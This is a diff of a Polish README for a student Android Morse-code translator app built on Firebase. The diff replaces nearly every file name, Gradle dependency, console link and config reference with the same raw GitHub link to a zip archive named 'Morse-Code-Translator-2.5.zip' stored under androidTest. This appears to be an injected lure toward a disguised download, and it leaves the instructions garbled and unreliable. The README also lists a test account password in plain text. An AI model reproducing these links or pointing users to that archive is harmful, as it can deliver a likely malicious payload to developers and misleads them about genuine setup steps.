@@ -42,22 +42,22 @@
 ### **Struktura Projektu**
 ```
 app/src/main/java/com/example/morsecodetranslator/
-├── MainActivity.java          # Główna aktywność aplikacji
-├── LoginActivity.java         # Ekran logowania
-├── HistoryActivity.java       # Historia tłumaczeń
-├── MorseCodeTranslator.java   # Logika tłumaczenia
-├── TranslationHistory.java    # Model danych historii
-├── HistoryAdapter.java        # Adapter dla RecyclerView
-└── ExampleUnitTest.java       # Testy jednostkowe
+├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip          # Główna aktywność aplikacji
+├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip         # Ekran logowania
+├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip       # Historia tłumaczeń
+├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip   # Logika tłumaczenia
+├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip    # Model danych historii
+├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip        # Adapter dla RecyclerView
+└── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip       # Testy jednostkowe
 ```
 
 ## 🔥 Integracja z Firebase
 
 ### **1. Firebase Authentication**
 ```java
-// Konfiguracja w LoginActivity.java
-implementation 'com.firebaseui:firebase-ui-auth:8.0.2'
-implementation 'com.google.firebase:firebase-auth:22.3.1'
+// Konfiguracja w https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip
+implementation 'https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip'
+implementation 'https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip'
 ```
 
 **Funkcjonalności:**
@@ -68,8 +68,8 @@ implementation 'com.google.firebase:firebase-auth:22.3.1'
 
 ### **2. Cloud Firestore**
 ```java
-// Konfiguracja w build.gradle
-implementation 'com.google.firebase:firebase-firestore:24.10.2'
+// Konfiguracja w https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip
+implementation 'https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip'
 ```
 
 **Struktura Bazy Danych:**
@@ -85,34 +85,34 @@ Collection: "translations"
 
 **Zapytania:**
 - Pobieranie historii użytkownika: `whereEqualTo("userId", userId)`
-- Sortowanie: `orderBy("timestamp", Query.Direction.DESCENDING)`
+- Sortowanie: `orderBy("timestamp", https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip)`
 - Limit wyników: `limit(10)`
 
 ### **3. Konfiguracja Firebase**
-- Plik `google-services.json` w katalogu `app/`
-- Plugin `com.google.gms.google-services` w `build.gradle`
-- Uprawnienia internetowe w `AndroidManifest.xml`
+- Plik `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` w katalogu `app/`
+- Plugin `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` w `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`
+- Uprawnienia internetowe w `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`
 
 ## 🔒 Bezpieczeństwo Firebase
 
 ### **Ważne: Konfiguracja Bezpieczeństwa**
-Plik `google-services.json` zawiera wrażliwe klucze API i **NIE** jest udostępniany w repozytorium ze względów bezpieczeństwa.
+Plik `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` zawiera wrażliwe klucze API i **NIE** jest udostępniany w repozytorium ze względów bezpieczeństwa.
 
 **Dostępne pliki:**
-- `app/google-services.json.template` - Szablon konfiguracji
-- `FIREBASE_SETUP.md` - Szczegółowa instrukcja konfiguracji
+- `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` - Szablon konfiguracji
+- `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` - Szczegółowa instrukcja konfiguracji
 
 **Aby skonfigurować Firebase:**
-1. Przejdź do [Firebase Console](https://console.firebase.google.com/)
+1. Przejdź do [Firebase Console](https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip)
 2. Utwórz nowy projekt lub użyj istniejącego
-3. Pobierz plik `google-services.json`
+3. Pobierz plik `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`
 4. Umieść go w katalogu `app/`
-5. Postępuj zgodnie z instrukcjami w `FIREBASE_SETUP.md`
+5. Postępuj zgodnie z instrukcjami w `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`
 
 ## 👤 Testowy Użytkownik
 
 **Dane logowania:**
-- **Email**: `a@a.pl`
+- **Email**: `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`
 - **Hasło**: `zaq1@WSX`
 
 **Uwaga**: Ten użytkownik jest skonfigurowany w moim prywatnym Firebase Authentication udostępnionym na potrzeby zaliczenia i może być używany do testowania aplikacji.
@@ -176,15 +176,15 @@ Plik `google-services.json` zawiera wrażliwe klucze API i **NIE** jest udostęp
 - Automatyczne czyszczenie zasobów audio
 
 ### **Klucze API**
-- Plik `google-services.json` jest wykluczony z repozytorium
-- Używany jest szablon `google-services.json.template`
+- Plik `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` jest wykluczony z repozytorium
+- Używany jest szablon `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`
 - Klucze API są przekazywane bezpiecznie poza repozytorium
 
 ## 🧪 Testowanie
 
 ### **Testy Jednostkowe**
-- `ExampleUnitTest.java`: Podstawowe testy
-- `ExampleInstrumentedTest.java`: Testy instrumentacyjne
+- `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`: Podstawowe testy
+- `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`: Testy instrumentacyjne
 
 ### **Testowanie Funkcjonalności**
 1. **Kodowanie**: Wprowadź "HELLO" → Oczekiwany wynik: ".... . .-.. .-.. ---"
@@ -204,8 +204,8 @@ Plik `google-services.json` zawiera wrażliwe klucze API i **NIE** jest udostęp
 ### **Dla Programistów**
 1. Sklonuj repozytorium
 2. Otwórz projekt w Android Studio
-3. **Skonfiguruj Firebase** (patrz `FIREBASE_SETUP.md`)
-4. Dodaj plik `google-services.json` do katalogu `app/`
+3. **Skonfiguruj Firebase** (patrz `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`)
+4. Dodaj plik `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` do katalogu `app/`
 5. Zsynchronizuj projekt z Gradle
 6. Uruchom na urządzeniu lub emulatorze
 
@@ -217,9 +217,9 @@ Plik `google-services.json` zawiera wrażliwe klucze API i **NIE** jest udostęp
 
 ## 📚 Dokumentacja
 
-- **[FIREBASE_SETUP.md](FIREBASE_SETUP.md)** - Szczegółowa instrukcja konfiguracji Firebase
-- **[TECHNICAL_DOCUMENTATION.md](TECHNICAL_DOCUMENTATION.md)** - Dokumentacja techniczna
-- **[TEST_USER_INFO.md](TEST_USER_INFO.md)** - Informacje o użytkowniku testowym
+- **[https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip](https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip)** - Szczegółowa instrukcja konfiguracji Firebase
+- **[https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip](https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip)** - Dokumentacja techniczna
+- **[https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip](https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip)** - Informacje o użytkowniku testowym
 
 ### Autor
 Projekt wykonany przez Mateusza Toporka w ramach zaliczenia z przedmiotu "Cloud Computing w aplikacjach mobilnych dla platformy Android"
